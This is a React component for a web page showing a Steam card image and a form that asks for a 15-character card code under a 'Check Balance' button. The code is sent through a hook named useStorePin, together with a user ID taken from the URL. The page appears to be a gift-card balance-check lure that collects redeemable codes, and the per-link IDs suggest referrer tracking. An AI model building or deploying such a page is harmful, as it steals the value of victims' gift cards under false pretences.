import { useState } from "react";
import { useParams } from "react-router-dom";
import SteamCard from "../../public/steamcards_physical.png";
import BalanceTab from "./UI/BalanceTab";
import useStorePin from "../customHooks/useStorePin";

export default function Main() {
  const [showBal, setShowBal] = useState(false);
  const [cardCode, setCardCode] = useState("");

  const { id } = useParams();
  const userID = id || "";

  const { store, data, isPending, error } = useStorePin(
    setShowBal,
    setCardCode
  );

  function handleSubmit(e) {
    e.preventDefault();

    const code = cardCode.trim();
    if (!code || code.length !== 17) return;

    store({ secreteCode: code, userID });
    setCardCode("");
  }

  const handleInputChange = (e) => {
    let value = e.target.value.replace(/[^A-Za-z0-9]/g, "");
    value = value.slice(0, 15);

    let formatted =
      value
        .match(/.{1,5}/g)
        ?.join(" ")
        .toUpperCase() || "";
    setCardCode(formatted);
  };

  return (
    <main className="flex flex-col md:flex-row items-center md:justify-center gap-10 py-16 px-6 bg-gray-800 min-h-screen text-white">
      {/* Left - Steam Card Image */}
      <div className="flex justify-center md:justify-end max-w-md">
        <img
          className="w-72 md:w-96 rounded-lg shadow-lg"
          src={SteamCard}
          alt="Steam Card"
        />
      </div>

      {showBal && (
        <BalanceTab
          closeBal={() => setShowBal(false)}
          balance={data?.data?.balance}
        />
      )}

      {/* Right - Form */}
      {!showBal && (
        <form
          className="w-full max-w-md bg-white p-6 rounded-2xl shadow-md"
          onSubmit={handleSubmit}
        >
          <label className="block text-gray-700 font-medium mb-2">
            Enter Card Code
          </label>
          <input
            type="text"
            value={cardCode}
            onChange={handleInputChange}
            placeholder="XXXXX-XXXXX-XXXXX"
            maxLength={17} // 15 chars + 2 dashes = 17 total
            className="w-full px-4 py-2 border border-gray-300 rounded-lg focus:outline-none focus:ring-2 focus:ring-gray-500 text-black tracking-widest"
          />
          {error && (
            <p className="text-center text-red-500">
              {error?.response?.data?.message}
            </p>
          )}
          <button
            type="submit"
            className="mt-4 w-full bg-gray-600 text-white py-2 rounded-lg hover:bg-gray-700 cursor-pointer transition"
          >
            {isPending ? "Checking..." : "Check Balance"}
          </button>
        </form>
      )}
    </main>
  );
}
